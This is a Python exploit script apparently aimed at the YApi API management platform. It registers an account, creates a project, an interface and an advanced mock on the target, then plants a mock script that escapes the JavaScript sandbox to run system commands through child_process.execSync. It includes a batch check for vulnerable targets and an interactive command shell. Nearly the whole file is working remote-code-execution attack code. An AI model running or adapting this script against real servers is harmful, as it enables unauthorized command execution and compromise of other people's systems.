# -*- coding: utf-8 -*-
import os

import requests
import random
import time
import json
import argparse
import base64

class yapi_rce:
    def __init__(self):
        self.url = ""
        self.filepath = ""
        self.session = requests.Session()
        self.UA = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36"
        }
        self.headers = {
            "Content-Type": "application/json;charset=utf-8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36"
        }
        self.random_num = str(random.randint(111111, 999999)) + str(int(time.time()))[:4 ] +'IIII'
        self.email = self.random_num +"@qq.com"
        self.password = self.random_num
        self.username = self.random_num
        self.timeout = 15
        self.path = "/"+str(random.randint(111111, 999999))
        self.group_id = 0
        self.project_id = 0
        self.interface_id = 0
    def targets_check(self, path):
        self.filepath = path
        if (not os.path.exists(self.filepath)):
            print("path is not exists!")
            exit()
        with open(self.filepath)as f:
            for url in f.readlines():
                self.check(url.strip('\n').strip('/'))

    def check(self, url):
        self.url = url
        # reg
        poc_url = self.url + "/api/user/reg"
        data = {"email": self.email, "password": self.password, "username": self.username}
        try:
            req = self.session.post(url=poc_url, data=data, headers=self.UA, timeout=self.timeout, verify=False)
            if req.status_code != 200 or 0 != json.loads(req.text)['errcode']:
                print("Website {url} not allowed to register".format(url=poc_url))
                return False
        except:
            print("Website {url} not allowed to register".format(url=poc_url))
            return False

        # get group_id
        poc_url = self.url +"/api/group/get_mygroup"
        try:
            req = self.session.get(url=poc_url, headers=self.UA, timeout=self.timeout, verify=False)
            if req.status_code != 200:
                print("{url} Failed to get group_id".format(url=poc_url))
                return False
            self.group_id = json.loads(req.text)['data']['_id']
        except:
            print("{url} Failed to get group_id".format(url=poc_url))
            return False

        # creat project
        poc_url = self.url + "/api/project/add"
        try:
            data = {"name": self.random_num, "group_id": str(self.group_id), "project_type": "private"}
            req = self.session.post(url=poc_url, data=data, headers=self.UA, timeout=self.timeout, verify=False)
            if req.status_code != 200:
                print("{url} Failed to get project_id".format(url=poc_url))
                return False
            self.project_id = json.loads(req.text)['data']['_id']
        except:
            print("{url} Failed to get project_id".format(url=poc_url))
            return False

        # creat interface
        poc_url = self.url + "/api/interface/add"
        try:
            data = {"project_id": str(self.project_id), "path": self.path, "title": self.random_num, "catid": "1", "method": "GET"}
            req = self.session.post(url=poc_url, data=data, headers=self.UA, timeout=self.timeout, verify=False)
            if req.status_code != 200:
                print("{url} Failed to get interface_id1".format(url=poc_url))
                return False
            self.interface_id = json.loads(req.text)['data']['_id']
        except:
            print("{url} Failed to get interface_id".format(url=poc_url))
            return False

        # creat mock
        poc_url = self.url + "/api/plugin/advmock/save"
        try:
            data = {"project_id": str(self.project_id), "interface_id": str(self.interface_id),
                    "mock_script": "const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"echo " + self.random_num + "\").toString()",
                    "enable": True}
            req = self.session.post(url=poc_url, data=json.dumps(data), headers=self.headers, timeout=self.timeout,
                                                verify=False)
            if req.status_code != 200:
                print("{url} Failed to create mock".format(url=poc_url))
                return False
        except:
            print("{url} Failed to create mock".format(url=poc_url))
            return False

        # use mock
        poc_url = self.url + "/mock/" + str(self.project_id) + self.path
        try:
            req = self.session.get(url=poc_url, headers=self.UA, timeout=self.timeout, verify=False)
            if req.status_code == 200 and self.random_num in req.text:
                print("The target {url} has a YAPI RCE".format(url=poc_url))
                return True
            else:
                print("There is no vulnerability in the {url}".format(url=poc_url))
                return False
        except:
            print("There is no vulnerability in the {url}".format(url=poc_url))
            return False

    def exploit(self, cmd):
        # creat mock
        poc_url = self.url + "/api/plugin/advmock/save"
        try:
            data = {"project_id": str(self.project_id), "interface_id": str(self.interface_id),
                    "mock_script": "const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nconst Buffer =  new FunctionConstructor('return Buffer')()\r\nmockJson = new Buffer(process.mainModule.require(\"child_process\").execSync(new Buffer('"+cmd+"','base64').toString()).toString()).toString('base64')",
                    "enable": True}
            req = self.session.post(url=poc_url, data=json.dumps(data), headers=self.headers, timeout=self.timeout,
                                                verify=False)
            if req.status_code != 200:
                print("Failed to save mock")
        except:
            print("Failed to save mock")

        # use mock
        poc_url = self.url + "/mock/" + str(self.project_id) + self.path
        try:
            req = self.session.get(url=poc_url, headers=self.UA, timeout=self.timeout, verify=False)
            if req.status_code == 200:
                print(base64.b64decode(req.text).decode())
            else:
                print("Please check the command")
        except:
            print("Please check the command")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='YAPI RCE EXP')
    parser.add_argument("-u", "--url", metavar="URI", help="Target Url")
    parser.add_argument("-f", "--file", metavar="File", help="Targets File")
    args = parser.parse_args()

    rce = yapi_rce()
    if args.file:
        rce.targets_check(args.file)
    elif args.url:
        url = args.url.strip('/')
        if rce.check(url):
            while 1:
                cmd = str(input("Please enter the command: "))
                if cmd != "exit":
                    rce.exploit(base64.b64encode(cmd.encode()).decode())
                else:
                    exit()
    else:
        usage = """usage: yapi_rce.py [-h] [-u URI] [-f File]

YAPI RCE EXP

optional arguments:
  -h, --help            show this help message and exit
  -u URI, --url URI     Target Url
  -f File, --file File  Targets File
"""
        print(usage)
        exit()
